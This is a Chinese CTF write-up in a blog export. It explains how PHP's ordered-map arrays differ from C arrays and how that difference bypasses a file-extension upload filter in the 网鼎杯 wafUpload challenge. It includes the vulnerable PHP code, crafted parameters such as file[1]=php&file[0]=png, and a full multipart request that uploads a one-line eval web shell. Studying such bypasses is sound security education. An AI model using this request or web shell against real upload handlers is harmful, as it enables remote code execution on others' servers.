{"title":"PHP数组与c数组差异而引发的安全问题","slug":"PHP数组与c数组差异而引发的问题","date":"2018-08-24T14:19:24.000Z","updated":"2018-09-02T02:32:34.436Z","comments":true,"excerpt":"","content":"<h1 id=\"C语言数组\"><a href=\"#C语言数组\" class=\"headerlink\" title=\"C语言数组\"></a>C语言数组</h1><p><strong>C语言的数组都是由连续的内存位置组成。最低的地址对应第一个元素，最高的地址对应最后一个元素。</strong><br><img src=\"https://fdrag0n.github.io/image/2018-8-24 235941/arrays.jpg\" alt=\"Alt text\"><br>设有一个数组</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int array[2];</span><br></pre></td></tr></table></figure>\n<p>无论是先给<code>array[0]</code>赋值,还是先给<code>array[1]</code>赋值，其在内存中的排序都是<code>array[0]</code>在前面<code>array[1]</code>在后面，所以无论是用指针指向array的最后一个单元还是直接引用<code>array[1]</code>的值,其所指的都是同一个值。</p>\n<h1 id=\"PHP的数组\"><a href=\"#PHP的数组\" class=\"headerlink\" title=\"PHP的数组\"></a>PHP的数组</h1><p><strong>而PHP数组与C语言数组不一样，PHP 中的数组实际上是一个有序映射。映射是一种把 values 关联到 keys 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组，或列表（向量），散列表（是映射的一种实现），字典，集合，栈，队列以及更多可能性。由于数组元素的值也可以是另一个数组，树形结构和多维数组也是允许的。</strong><br>贴上一个简易的上传过滤源码</p>\n<pre><code>&lt;?php\n    $file = $_GET[&apos;file&apos;];\n    if (!is_array($file)) {\n        $file = explode(&apos;.&apos;, strtolower($file));\n    }\n    print_r ($file);\n    echo &apos;&lt;/br&gt;&apos;;\n    $ext = end($file);\n    if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) {\n        print(&apos;This file is not allowed!&lt;/br&gt;&apos;);\n    }\n    else print(&apos;success!&lt;/br&gt;&apos;);\n    var_dump($file);\n    echo &apos;&lt;/br&gt;&apos;;\n    $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];\n    echo &apos;filename:&apos;.$filename;\n    echo &apos;&lt;/br&gt;&apos;;\n    echo &apos;end($file):&apos;.end($file);\n?&gt;\n</code></pre><p>如图<code>file[0]</code>和<code>file[1]</code>都是由get传参，如果先给<code>file[0]</code>赋值png，再给<code>file[1]</code>赋值php的话，会被拦截。</p>\n<pre><code>file[0]=png&amp;file[1]=php\n</code></pre><p>但是如果先给<code>file[1]</code>赋值php，再给<code>file[0]</code>赋值png的话，则可以成功绕过过滤规则上传。</p>\n<pre><code>file[1]=php&amp;file[0]=png\n</code></pre><p>演示截图：</p>\n<p><img src=\"https://fdrag0n.github.io/image/2018-8-24 235941/2018-8-24 231639.PNG\" alt=\"Alt text\"></p>\n<p>代码第六行和第十二行将其显示出来，由图右侧可见，如果先给<code>file[0]</code>赋值png，再给<code>file[1]</code>赋值php的话，数组是<code>Array ( [0] =&gt; png [1] =&gt; php )</code>，会被拦截。</p>\n<p>而如果先给<code>file[1]</code>赋值php，再给<code>file[0]</code>赋值png的话，数组就是<code>Array ( [1] =&gt; php [0] =&gt; png )</code> ,它所占内存区域中最后一个单元是<code>file[0]=&gt;png</code>，而<strong>不像</strong>C语言一样是file[1]，所以如果过滤代码一方面用<code>end()</code>来取出数组最后一个单元，而另外一处却用<code>$file[count($file) - 1]</code>来取出最后一个单元，就会存在有绕过的漏洞。</p>\n<h1 id=\"拿python来比较一下更好说明\"><a href=\"#拿python来比较一下更好说明\" class=\"headerlink\" title=\"拿python来比较一下更好说明\"></a>拿python来比较一下更好说明</h1><ul>\n<li>C语言的数组更像Python 列表(List)</li>\n<li>而PHP的数组像Python 字典(Dictionary)</li>\n</ul>\n<h1 id=\"涉及到的CTF：-网鼎杯第二场的上传题–wafUpload\"><a href=\"#涉及到的CTF：-网鼎杯第二场的上传题–wafUpload\" class=\"headerlink\" title=\"涉及到的CTF： 网鼎杯第二场的上传题–wafUpload\"></a>涉及到的CTF： 网鼎杯第二场的上传题–wafUpload</h1><pre><code>&lt;?php\n$sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);\n@mkdir($sandbox);\n@chdir($sandbox);\n\nif (!empty($_FILES[&apos;file&apos;])) {\n#mime check\nif (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) {\ndie(&apos;This type is not allowed!&apos;);\n}\n\n#check filename\n$file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;];\nif (!is_array($file)) {\n$file = explode(&apos;.&apos;, strtolower($file));\n}\n$ext = end($file);\nif (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) {\ndie(&apos;This file is not allowed!&apos;);\n}\n\n$filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];\nif (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) {\necho &apos;Success!&apos;;\necho &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename;\n} else {\necho &apos;Failed!&apos;;\n}\n}\nshow_source(__file__);\n?&gt;\n</code></pre><ul>\n<li>第8-10行mime check部分 MIME 类型检测，使用图片马绕过。</li>\n<li>第12-20行check filename部分 对文件后缀进行了检测，而后缀名则是取 <code>$file</code> 数组中最后一个元素。然后在生成文件的时候，文件名取<code>$file</code> 数组的最后一个元素做后缀，这明显存在绕过。我们只要控制<code>$file</code>数组中参数的即可绕过并 getshell ，请求数据包如下</li>\n</ul>\n<pre><code>POST / HTTP/1.1\nHost: 4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nReferer: http://4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com/\nContent-Type: multipart/form-data; boundary=---------------------------9930139772306\nContent-Length: 524\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n-----------------------------9930139772123\nContent-Disposition: form-data; name=&quot;filename[1]&quot;\n\nphp\n-----------------------------9930139772123\nContent-Disposition: form-data; name=&quot;filename[0]&quot;\n\npng\n-----------------------------9930139772123\nContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;fdrag0n.jpg&quot;\nContent-Type: image/jpeg\n\n&lt;?php @eval($_POST[&apos;a&apos;]);?&gt;\n-----------------------------9930139772123\nContent-Disposition: form-data; name=&quot;submit&quot;\n\nSubmit\n-----------------------------9930139772123--\n</code></pre>","categories":[],"tags":[]}